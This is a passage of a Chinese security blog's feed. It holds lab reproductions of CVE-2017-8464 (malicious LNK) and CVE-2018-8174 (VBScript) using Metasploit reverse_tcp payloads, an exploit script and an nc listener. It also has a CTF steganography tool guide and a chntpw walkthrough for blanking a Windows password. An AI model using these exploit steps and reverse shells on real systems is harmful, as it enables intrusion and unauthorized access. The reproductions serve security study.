    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>2017年6月13日，微软官方发布编号为CVE-2017-8464的漏洞公告，官方介绍Windows系统在解析快捷方式时存在远程执行任意代码的高危漏洞，黑客可以通过U盘、网络共享等途径触发漏洞，完全控制用户系统，<br>攻击者可以向用户呈现包含恶意的.LNK文件和相关联的恶意二进制文件的可移动驱动器或远程共享。 当用户在Windows资源管理器或解析.LNK文件的任何其他应用程序中打开此驱动器（或远程共享）时，恶意二进制程序将在目标系统上执行攻击者选择的代码，成功利用此漏洞的攻击者可以获得与本地用户相同的用户权限。<br>注释:<code>.LNK</code>是windows系统内应用程序快捷方式文件的文件类型后缀名。<br>漏洞利用条件和方式:<br>远程利用 漏洞影响范围:<br>Microsoft Windows 10 Version 1607 for 32-bit SystemsMicrosoft Windows 10 Version 1607 for x64-based SystemsMicrosoft Windows 10 for 32-bit SystemsMicrosoft Windows 10 for x64-based SystemsMicrosoft Windows 10 version 1511 for 32-bit SystemsMicrosoft Windows 10 version 1511 for x64-based SystemsMicrosoft Windows 10 version 1703 for 32-bit SystemsMicrosoft Windows 10 version 1703 for x64-based SystemsMicrosoft Windows 7 for 32-bit Systems SP1Microsoft Windows 7 for x64-based Systems SP1Microsoft Windows 8.1 for 32-bit SystemsMicrosoft Windows 8.1 for x64-based SystemsMicrosoft Windows RT 8.1</p><h2 id="win7x64本地复现"><a href="#win7x64本地复现" class="headerlink" title="win7x64本地复现"></a>win7x64本地复现</h2><p>kalix64   192.168.1.101  攻击机<br>windows7x64  192.168.1.111  目标靶机</p><h4 id="0x000下载msf脚本"><a href="#0x000下载msf脚本" class="headerlink" title="0x000下载msf脚本"></a>0x000下载msf脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/metasploit-framework/modules/exploits/windows/fileformat/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wget https://raw.githubusercontent.com/ykoster/metasploit-framework/169e00bf3442447324df064192db62cdc5b5b860/modules/exploits/windows/fileformat/cve_2017_8464_lnk_rce.rb</span><br></pre></td></tr></table></figure><h4 id="0x01生成监听shell"><a href="#0x01生成监听shell" class="headerlink" title="0x01生成监听shell"></a>0x01生成监听shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf  exploit(handler) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set LHOST 192.168.1.101</span><br><span class="line">msf exploit(handler) &gt; exploit -j</span><br></pre></td></tr></table></figure><h4 id="0x02生成-LNK文件"><a href="#0x02生成-LNK文件" class="headerlink" title="0x02生成.LNK文件"></a>0x02生成.LNK文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; back</span><br><span class="line">msf &gt; use exploits/windows/fileformat/cve_2017_8464_lnk_rce</span><br><span class="line">msf exploit(windows/fileformat/cve_2017_8464_lnk_rce) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line">PAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(windows/fileformat/cve_2017_8464_lnk_rce) &gt; set LHOST 192.168.1.101</span><br><span class="line">LHOST =&gt; 192.168.1.101</span><br><span class="line">msf exploit(windows/fileformat/cve_2017_8464_lnk_rce) &gt; exploit</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/09/11/5b976ddb0f95a.png" alt=""></p><h4 id="0x03复制到win7运行"><a href="#0x03复制到win7运行" class="headerlink" title="0x03复制到win7运行"></a>0x03复制到win7运行</h4><p><img src="https://i.loli.net/2018/09/11/5b976ddb39d97.png" alt=""></p><h4 id="0x04最后"><a href="#0x04最后" class="headerlink" title="0x04最后"></a>0x04最后</h4><p><img src="https://i.loli.net/2018/09/11/5b976ddb87cfb.png" alt=""></p><p><code>sessions -i 1</code></p><p><img src="https://i.loli.net/2018/09/11/5b976ddb52098.png" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/backlion/p/7243636.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/7243636.html</a><br><a href="https://github.com/ykoster/metasploit-framework/blob/b669b9fb81efdec4f59177116ee9524d71527d37/documentation/modules/exploit/windows/fileformat/cve_2017_8464_lnk_rce.md" target="_blank" rel="noopener">https://github.com/ykoster/metasploit-framework/blob/b669b9fb81efdec4f59177116ee9524d71527d37/documentation/modules/exploit/windows/fileformat/cve_2017_8464_lnk_rce.md</a><br><a href="https://3gstudent.github.io/3gstudent.github.io/Windows-Lnk%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2017-8464)%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Windows-Lnk%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2017-8464)%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;2017年6月13日，微软官方发布编号为CVE-2017-8464的漏洞公告，官方介绍Windows系统在解析快捷方式时存在
      
    
    </summary>
    
    
      <category term="CVE-2017-8464" scheme="https://threst.github.io/tags/CVE-2017-8464/"/>
    
  </entry>
  
  <entry>
    <title>双杀0day漏洞(CVE-2018-8174)复现</title>
    <link href="https://threst.github.io/2018/09/09/%E5%8F%8C%E6%9D%800day%E6%BC%8F%E6%B4%9E(CVE-2018-8174)%E5%A4%8D%E7%8E%B0/"/>
    <id>https://threst.github.io/2018/09/09/双杀0day漏洞(CVE-2018-8174)复现/</id>
    <published>2018-09-09T14:13:14.000Z</published>
    <updated>2018-09-09T05:41:27.091Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h2><p>CVE-2018-8174 是 Windows VBScript Engine 代码执行漏洞。<br>微软在4月20日早上确认此漏洞，并于5月8号发布了官方安全补丁，对该 0day 漏洞进行了修复，将其命名为 CVE-2018-8174<br>由于 VBScript 脚本执行引擎(vbscript.dll)存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码。</p><h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><p>攻击机 IP：192.168.1.101<br>靶机 IP：192.168.1.111</p><p>github:<a href="https://github.com/Yt1g3r/CVE-2018-8174_EXP" target="_blank" rel="noopener">https://github.com/Yt1g3r/CVE-2018-8174_EXP</a></p><h2 id="0x01-生成payload"><a href="#0x01-生成payload" class="headerlink" title="0x01 生成payload"></a>0x01 生成payload</h2><p><code>python CVE-2018-8174.py -u http://192.168.1.101/ -o exp.rtf -i 192.168.1.101 -p 4444</code></p><p><code>-u</code>:url地址<br><code>-o</code>: 输出文件<br><code>-i</code>：监听地址<br><code>-p</code>：监听端口</p><h2 id="0x02-测试"><a href="#0x02-测试" class="headerlink" title="0x02 测试"></a>0x02 测试</h2><p>把 explot.html 复制到 /var/www/html/，并开启 apache 服务</p><p><code>sudo cp exploit.html /var/www/html/</code></p><p>开启Apache服务<br><code>sudo service  apache2 start</code></p><p>攻击机监听端口<br><code>nc -lvvp 4444</code></p><p>靶机使用IE打开URL<br><code>http://192.168.1.101/exploit.html</code></p><p>靶机打开生成的Word文档也是一样的，可是我没测试成功</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;漏洞描述：&quot;&gt;&lt;a href=&quot;#漏洞描述：&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述：&quot;&gt;&lt;/a&gt;漏洞描述：&lt;/h2&gt;&lt;p&gt;CVE-2018-8174 是 Windows VBScript Engine 代码执行漏洞。&lt;br&gt;微软在4月20
      
    
    </summary>
    
    
      <category term="CVE-2018-8174" scheme="https://threst.github.io/tags/CVE-2018-8174/"/>
    
  </entry>
  
  <entry>
    <title>ctf之隱寫術</title>
    <link href="https://threst.github.io/2018/08/28/CTF%E4%B9%8B%E9%9A%90%E5%86%99%E6%9C%AF/"/>
    <id>https://threst.github.io/2018/08/28/CTF之隐写术/</id>
    <published>2018-08-28T14:13:14.000Z</published>
    <updated>2018-08-28T03:32:30.290Z</updated>
    
    <content type="html"><![CDATA[<h2 id="写在前面的话"><a href="#写在前面的话" class="headerlink" title="写在前面的话"></a>写在前面的话</h2><p>做了这么多的ctf比赛，告诉我个道理——再少不会少隐写！！！隐写题可是每次比赛都有的，But回顾过去，摸着自己的良心说那次解题不是用工具去套，套中了就解开了，没套中就凉了，于是在这种大背景下，我打算写一篇关于隐写的系(xia)统(che）的文章。各位师傅看就看，别骂人。</p><h2 id="what-is-隐写？"><a href="#what-is-隐写？" class="headerlink" title="what is 隐写？"></a>what is 隐写？</h2><p>参考百度上面说就是：隐写术(Steganography)是一门关于信息隐藏的技巧与科学，所谓信息隐藏指的是不让除预期的接收者之外的任何人知晓信息的传递事件或者信息的内容。这里提到了信息隐藏技术，粗略的说下，信息隐藏技术不仅仅只包括隐写术，还有数字水印，隐蔽信道，阀下信道，匿名通信这几种，但是我们都不需要了解，其中数字水印主要应用于产权保护，而隐写术主要应用于通信。</p><h2 id="隐写术应用场景"><a href="#隐写术应用场景" class="headerlink" title="隐写术应用场景"></a>隐写术应用场景</h2><p>要说隐写术的应用不得不提下伟大的Simmons模型，由于最近在看&lt;你好，旧时光&gt;(真心好看)，就拿林杨和余周周来打比方。<br>1.林杨和余周周分属两个教室，一个文科，一个理科。<br>2.为了将同学情谊升华需要进行通信，而通信的短信必须经过中间的潘主任的审阅。<br>3.潘主任可以阅读短信的内容，而且阅读后可以判断他们是否早恋。</p><h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h4><p>加密短信方法不可取，因为潘主任会阅读传送的信息的内容，加密后的信息大概率会引起潘主任的怀疑，潘主任可以以此为依据对他们进行调查。因此林杨和余周周需要一种对通信过程隐藏的手段。<br>这么分析一下，可能很多同学对密码学和隐写术产生了困惑，什么时候用隐写，什么时候用密码？<br>密码学与隐写术要根据请情况的不同来选择。<br>密码学：试图通过对信息加密的方式，使信息变得无意义，继而使他人无法获得真正的信息。<br>隐写术：试图隐藏通信事件本身。<br>但他们都有相同目的都是为了针对第三方，在隐蔽性方面(总体上)隐写&gt;加密。因为加密后的文本通常为无意义文本，较易察觉(当然也存在诸如培根密码等密文为有意义文本的加密方<br>式),但在安全性上面(总体上)加密&gt;隐写,隐写方式或算法一但被识别，通常也就取得信息了，但是加密通常即使知道加密算法也无法解出明文(不考虑碰撞)。</p><p>现代数字隐写四大载体</p><ul><li>1.文本：字体、空格、标点、行间距等<br>2.图像：各类图片格式特征(png、jpg、bmp)<br>3.音频：mp3 stego、波形图、频谱图<br>4.视频：压缩视频、未压缩视频</li></ul><h3 id="关于CTF比赛"><a href="#关于CTF比赛" class="headerlink" title="关于CTF比赛"></a>关于CTF比赛</h3><p>在ctf比赛中隐写套路较为固定比赛工具较为成熟。<br>好处：通常题目难度较低，即使没有解题思路，依次尝试各个解法往往也能在没发现提示<br>的情况下找出问题所在。<br>坏处：容易形成思维定势，一旦题目考察方式不常规，往往容易无从下手，不知道从哪开<br>始去分析，失去独立发现问题和思考的能力。<br>通常作为MISC类题目的一个考察方向，(这里MISC泛指Misc &amp; Steganography &amp; forensic &amp; Crypto)，因为不作为单独分类，因此隐写术通常只是一道Misc题中的一部分，与其他考察方向<br>共同构成一道完整的Misc题。在国外CTF比赛中以计算机取证(Forensics)类的题目出现。</p><h2 id="CTF比赛中的典型隐写分析工具"><a href="#CTF比赛中的典型隐写分析工具" class="headerlink" title="CTF比赛中的典型隐写分析工具"></a>CTF比赛中的典型隐写分析工具</h2><h4 id="Binwalk"><a href="#Binwalk" class="headerlink" title="Binwalk"></a>Binwalk</h4><p>固件分析工具，常用作路由器逆向、后门分析，或识别二进制图像中的嵌入式文件和可<br>执行代码<br>常用参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">命令：binwalk -e firmware.bin——选项“-e&quot;和“--extract&quot;用于按照定义的配置文件中的提取方法从固件中提取探测到的文件系统。</span><br><span class="line">命令：binwalk -Me firmware.bin——选项“-M&quot;和“--matryoshka&quot;用于根据magic签名扫描结果进行递归提取，仅对&quot;-e&quot;和“--dd&quot;选项有效。</span><br><span class="line">命令：binwalk -Me -d 5 firmware.bin——选项“-d&quot;和“--depth=&lt;int&gt;&quot;用于限制递归提取深度，默认深度为8，仅当“-M&quot;选项存在时有效。</span><br></pre></td></tr></table></figure></p><h4 id="Stegsolve"><a href="#Stegsolve" class="headerlink" title="Stegsolve"></a>Stegsolve</h4><p>图片通道查看器,常用参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Analyse下拉菜单：</span><br><span class="line">File Format：查看文件格式和参数信息，有时候flag会写在图片信息里</span><br><span class="line">Data Extract：数据提取，如LSB隐写等在这个选项中提取信息</span><br><span class="line">Stereogram solver：立体视图，可以左右移动控制偏移量</span><br><span class="line">Frame Broswer：逐帧浏览，如查看快速闪过的GIF图中的flag</span><br><span class="line">Image Combiner：图片结合，可以对两张图片做xor、add、sub等运算</span><br></pre></td></tr></table></figure></p><h4 id="StegDetect"><a href="#StegDetect" class="headerlink" title="StegDetect"></a>StegDetect</h4><p>数字图像隐写分析工具，主要针对JPEG,常用参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-q 仅显示可能包含隐藏内容的图像。</span><br><span class="line">-n 启用检查JPEG文件头功能，以降低误报率。如果启用，所有带有批注区域的文件将被视为没有被嵌入信息。如果JPEG文件的JFIF标识符中的版本号不是1.1，则禁用OutGuess检测。</span><br><span class="line">-s 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。</span><br><span class="line">-d 打印带行号的调试信息。</span><br><span class="line">-t 设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下：</span><br><span class="line">j 检测图像中的信息是否是用jsteg嵌入的。</span><br><span class="line">o 检测图像中的信息是否是用outguess嵌入的。</span><br><span class="line">p 检测图像中的信息是否是用jphide嵌入的。</span><br><span class="line">i 检测图像中的信息是否是用invisible secrets嵌入的。</span><br></pre></td></tr></table></figure></p><h4 id="Foremost"><a href="#Foremost" class="headerlink" title="Foremost"></a>Foremost</h4><p>基于文件开始格式，文件结束标志和内部数据结构进行恢复文件的程序。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-V  - 显示版权信息并退出</span><br><span class="line">-t  - 指定文件类型.  (-t jpeg,pdf ...) </span><br><span class="line">-d  -打开间接块检测 (针对UNIX文件系统) </span><br><span class="line">-i  - 指定输入文件 (默认为标准输入) </span><br><span class="line">-a  - 写入所有的文件头部, 不执行错误检测(损坏文件) </span><br><span class="line">-w  - 向磁盘写入审计文件，不写入任何检测到的文件</span><br><span class="line">-o  - 设置输出目录 (默认为为输出)</span><br><span class="line">-c  - 设置配置文件 (默认为 foremost.conf)</span><br><span class="line">-q  - 启用快速模式. 在512字节边界执行搜索.</span><br><span class="line">-Q  - 启用安静模式. 禁用输出消息. </span><br><span class="line">-v  - 详细模式. 向屏幕上记录所有消息。</span><br></pre></td></tr></table></figure></p><h4 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h4><p>strings命令在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束。 strings命令对识别随机对象文件很有用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-a --all：扫描整个文件而不是只扫描目标文件初始化和装载段</span><br><span class="line">-f –print-file-name：在显示字符串前先显示文件名</span><br><span class="line">-t --radix=&#123;o,d,x&#125; ：输出字符的位置，基于八进制，十进制或者十六进制</span><br><span class="line">-e --encoding=&#123;s,S,b,l,B,L&#125; ：选择字符大小和排列顺序:s = 7-bit, S = 8-bit, &#123;b,l&#125; = 16-bit, &#123;B,L&#125; = 32-bit</span><br></pre></td></tr></table></figure></p><h2 id="常见文件格式"><a href="#常见文件格式" class="headerlink" title="常见文件格式"></a>常见文件格式</h2><h3 id="what-is-文件格式"><a href="#what-is-文件格式" class="headerlink" title="what is 文件格式?"></a>what is 文件格式?</h3><p>文件格式（或文件类型）是指电脑为了存储信息而使用的对信息的特殊编码方式，是用于识别内部储存的资料。比如有的储存图片，有的储存程序，有的储存文字信息。每一类信息，都可以一种或多种文件格式保存在电脑存储中。每一种文件格式通常会有一种或多种扩展名可以用来识别，但也可能没有扩展名。扩展名可以帮助应用程序识别的文件格式。</p><h3 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h3><p>文件头就是是位于文件开头的一段承担一定任务的数据。一般都在开头的部分。以jpg图片和zip压缩包文件为例。图6和图7分别是jpg图片的文件头以及jpg图片的结尾。</p><h3 id="txt格式"><a href="#txt格式" class="headerlink" title="txt格式"></a>txt格式</h3><p>txt是微软在操作系统上附带的一种文本格式，是最常见的一种文件格式 ，早在DOS时代应用就很多，主要存文本信息，即为文字信息，现在的操作系统大多使用记事本等程序保存，大多数软件可以查看，如记事本，浏览器等等。<br><img src="https://i.loli.net/2018/07/28/5b5c2ff8cadd7.jpg" alt="txt.jpg"></p><h4 id="doc-docx格式"><a href="#doc-docx格式" class="headerlink" title="doc/docx格式"></a>doc/docx格式</h4><p>doc即document的缩写，docx在doc的基础上加入了xml，通常是指Microsoft Office Word软件创建的文件格式，docx实际上是作为一个zip压缩方式的压缩文件，docx相对doc体积更小，支持的对象更多，同常采用AOPR的工具爆破docx的难度更大。<br><img src="https://i.loli.net/2018/07/28/5b5c3256e7cdc.jpg" alt="doc和docx大小.jpg"><br>doc和docx中内容一样，docx比doc相比，体积更小。<br><img src="https://i.loli.net/2018/07/28/5b5c325808e21.jpg" alt="docx.jpg"><br>注意这里标记的pk，其实docx可以讲是一种zip文件。我们把后缀名改成zip试试。<br><img src="https://i.loli.net/2018/07/28/5b5c501148515.jpg" alt="docxzip.jpg"><br>可以看到，可以用解压软件打开。<br><img src="https://i.loli.net/2018/07/28/5b5c325811908.jpg" alt="doc.jpg"></p><h4 id="png格式"><a href="#png格式" class="headerlink" title="png格式"></a>png格式</h4><p>属于无损压缩的位图格式，他采用LZ77的派生算法进行压缩，压缩比高，文件体积小，同时不损失颜色和数据，一个png文件可以由一个文件头标志和若干个数据块构成，而数据块有可以分为关键数据块和辅助数据块，每一类数据块又包含若干具体的数据块部分。</p><p>拿张png的图片来举个例子．<br><img src="https://i.loli.net/2018/07/28/5b5c4ef373d27.png" alt="png"><br>丢到winhex中分析，对于一个PNG文件来说，其文件头总是由位固定的字节来描述的，剩余的部分由 3 个以上的 PNG 的数据块（Chunk）按照特定的顺序组成。PNG图片是有两种数据块的，一个是叫关键数据块，另一种是辅助数据块。正常的关键数据块，定义了4种标准数据块，每个PNG文件都必须包含它们。<br>一般格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件头 89 50 4E 47 0D 0A 1A 0A+数据块+数据块+数据块……</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/06/01/5b1158a6079eb.png" alt=""></p><h4 id="jpeg格式"><a href="#jpeg格式" class="headerlink" title="jpeg格式"></a>jpeg格式</h4><p>JPEG 是有损压缩格式，将像素信息用JPEG保存成文件再读取出来，其中某些像素值会有少许变化。在保存时有个质量参数可在0至100之间选择，参数越大图片就越保真，但图片的体积也就越大。一般情况下选择 70 或 80 就足够了,png主要是块，而jpeg主要是以段的形式<br><img src="https://i.loli.net/2018/07/28/5b5c51e8274a8.jpg" alt="jpg"><br>一样拿张图片做栗子，注意jpg文件有些段是没有长度描述也没有内容，只有段标识和段类型。比如文件头和文件尾均属于这种段，段与段之间无论有多少 <code>FF</code>都是合法的，这些<code>FF</code>称为「填充字节」，必须被忽略掉。<br><img src="https://i.loli.net/2018/07/28/5b5c586860555.jpg" alt="文件头.jpg"><br><code>0xffd8</code>和 <code>0xffd9</code>为 JPG 文件的开始结束的标志<br><img src="https://i.loli.net/2018/07/28/5b5c5b13c92a9.jpg" alt="文件尾.jpg"></p><h4 id="bmp格式"><a href="#bmp格式" class="headerlink" title="bmp格式"></a>bmp格式</h4><p>是windows的标准图像文件格式，通常情况下采用位映射存储格式，除了图像的深度(可以理解为控制色彩的能力)可选外，不采用任何其他的压缩方式，因此bmp的图像质量非常高，体积也非常大，bmp图像通常可以分为设备相关位图和设备无关位图两大类，一个bmp的文件格式通常由文件头，信息头，颜色信息和位图数据四部分组成<br>文件头:前面两个字节一般42 4D，随后4个字节表示位图大小,再后面4个字节为保留位设置为0,再后面的4个字节非常关键，表示文件头到位图数据的偏移量<br><img src="https://i.loli.net/2018/07/28/5b5c5bd8ec998.bmp" alt="1.bmp"></p><p><img src="https://i.loli.net/2018/07/28/5b5c5e8d58825.jpg" alt="bmp.jpg"><br>其中图像文件头。<code>0x4d42=’BM’</code>，表示是Windows支持的BMP格式。(注意：查ascii表B 0x42,M0x4d,bfType为两个字节，B为low字节，M为high字节所以bfType=<code>0x4D42</code>，而不是<code>0x424D</code>，请注意)<br><a href="https://baike.baidu.com/item/BMP/35116" target="_blank" rel="noopener">https://baike.baidu.com/item/BMP/35116</a></p><h4 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h4><p>gif就是我们经常看见的动图,比如各种表情包,从文件格式来讲它也是一种无损压缩，它存储的不是颜色的本身，而是该点的颜色列表的索引值，其内部分成许多存储快，可以用来存储多副图像或者是决定图像表现行为的控制块，继而实现动图和交互式应用，一个gif图像通常由文件头，gif数据流和文件终结器三个部分组成，目前常见的有87(不支持动图)和89两个版本.</p><p><img src="https://i.loli.net/2018/07/28/5b5c62100b597.gif" alt="gif"></p><p>我们还是用一张git图来举栗子</p><p><code>&lt;GIF数据流&gt; ::= 头部 &lt;；逻辑视屏&gt; &lt;；数据&gt;* 尾记录</code>,这个规则将<gif 数据流="">；实体定义如下。它必须以头部开始，头部后面接一个逻辑视屏实体，该实体要用其他规则来定义。最后，数据实体接结束符。数据实体后面的*表示数据实体可以在此位置出现0或多次。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;Gif 数据流&gt; ::= 头部 &lt;；逻辑视屏&gt; &lt;；数据&gt;* 尾记录</span><br><span class="line">&lt;；逻辑视屏&gt; ::= 逻辑视屏描述块 [全局色表]</span><br><span class="line">&lt;；数据&gt; ::= &lt;；成象块&gt; |&lt;；特殊用途块&gt;</span><br><span class="line">&lt;；成象块&gt; ::= [图象控制扩充] &lt;；成象块&gt;</span><br><span class="line">&lt;；成象块&gt; ::= &lt;；基于表的图象&gt; |纯文本扩充</span><br><span class="line">&lt;；基于表的图象&gt; ::= 图象描述符 [局部色表] 图象数据</span><br><span class="line">&lt;；特殊用途块&gt; ::= 应用扩充 |注释扩充</span><br></pre></td></tr></table></figure></gif></p><p><img src="https://i.loli.net/2018/07/29/5b5d69773c0d7.jpg" alt="gif.jpg"></p><h4 id="mp3"><a href="#mp3" class="headerlink" title="mp3"></a>mp3</h4><p>mp3格式是在音频隐写中常见的一种格式,mp3即MPEG-a Audio Layer-3的简称，根据压缩质量和编码的复杂程度可以大致分为3层，分别对应与mp1,mp2,mp3,这三种有损压缩的声音文件，根据用途的不同，每层采用的编码方式也不同，其编码层次越高，编码器就越复杂，压缩率也高，一个mp3文件大致可以分成TAG_V2,Frame,TAG_V1三部分，其中frame是构成mp3的最小组成单位。<br>拿十三哥的音频来举个例子,使用audacity工具可以查看mp3的波形图,频谱图.<br><img src="https://i.loli.net/2018/07/28/5b5c612c4846e.jpg" alt="mp32.jpg"></p><p><img src="https://i.loli.net/2018/07/28/5b5c612c8f6ca.jpg" alt="mp3.jpg"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;写在前面的话&quot;&gt;&lt;a href=&quot;#写在前面的话&quot; class=&quot;headerlink&quot; title=&quot;写在前面的话&quot;&gt;&lt;/a&gt;写在前面的话&lt;/h2&gt;&lt;p&gt;做了这么多的ctf比赛，告诉我个道理——再少不会少隐写！！！隐写题可是每次比赛都有的，But回顾过去，摸着自
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://threst.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>艰难的kali破解xp开机密码之路</title>
    <link href="https://threst.github.io/2018/06/15/kali%E7%A0%B4%E8%A7%A3xp%E5%BC%80%E6%9C%BA%E5%AF%86%E7%A0%81/"/>
    <id>https://threst.github.io/2018/06/15/kali破解xp开机密码/</id>
    <published>2018-06-15T14:13:14.000Z</published>
    <updated>2018-06-15T14:30:58.014Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>今天一个妹子来找我，说开机密码忘记了，说是妹子其实根本没看见人——因为是他男朋友送电脑过来的，刺激！！</p><h2 id="win10pe初尝试"><a href="#win10pe初尝试" class="headerlink" title="win10pe初尝试"></a>win10pe初尝试</h2><p>拿到电脑那一刻，懵懂了，这哪是电脑，这根本就是十年前的古董啊！！病毒运行起来都卡，一大堆问题，本来是想直接用微pe盘破解（微pe真心好用），哪想这古董识别不了u盘</p><p>古董照片<br><img src="https://i.loli.net/2018/06/15/5b23c8cd36de6.jpg" alt=""></p><h2 id="kali大法好"><a href="#kali大法好" class="headerlink" title="kali大法好"></a>kali大法好</h2><p>正好威神那里有kali的启动盘，抱着试一试的想法插入了，啊！居然可以识别，直接设为u盘启动，开启kali<br>参考:<a href="https://blog.csdn.net/qq_31481187/article/details/52602454" target="_blank" rel="noopener">https://blog.csdn.net/qq_31481187/article/details/52602454</a><br>先挂载windows的系统盘，打开终端，输入<br><code>cd /WINDOWS/system32/config</code></p><p>然后使用chntpw神器<br><code>chntpw -l SAM</code></p><p><img src="https://i.loli.net/2018/06/15/5b23c941d0cb6.jpg" alt=""></p><p>看见<code>Administrator</code>用户</p><p>输入：<br><code>chntpw -u Adminstrator SAM</code></p><p><img src="https://i.loli.net/2018/06/15/5b23c9a302c02.jpg" alt=""></p><p>要你选择<br><img src="https://i.loli.net/2018/06/15/5b23ca01d02bd.jpg" alt=""></p><h5 id="选择2解锁密码-最后退出的时候要需选择y，因为第一次选择1-退出输入n结果并没有改密码"><a href="#选择2解锁密码-最后退出的时候要需选择y，因为第一次选择1-退出输入n结果并没有改密码" class="headerlink" title="选择2解锁密码,最后退出的时候要需选择y，因为第一次选择1,退出输入n结果并没有改密码"></a>选择2解锁密码,最后退出的时候要需选择y，因为第一次选择1,退出输入n结果并没有改密码</h5><p>在输入<code>chntpw -u Adminstrator SAM</code>检查下<br><img src="https://i.loli.net/2018/06/15/5b23ca06ece30.jpg" alt=""><br>已经是blank了</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p><img src="https://i.loli.net/2018/06/15/5b23caf35f99e.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;今天一个妹子来找我，说开机密码忘记了，说是妹子其实根本没看见人——因为是他男朋友送电脑过来的，刺激！！&lt;/p&gt;
&lt;h2 id=&quot;win10p
      
    
    </summary>
    
    
      <category term="瞎记罢写" scheme="https://threst.github.io/tags/%E7%9E%8E%E8%AE%B0%E7%BD%A2%E5%86%99/"/>
    
  </entry>
  
  <entry>
    <title>利用 PATH 环境变量进行 Linux 提权</title>
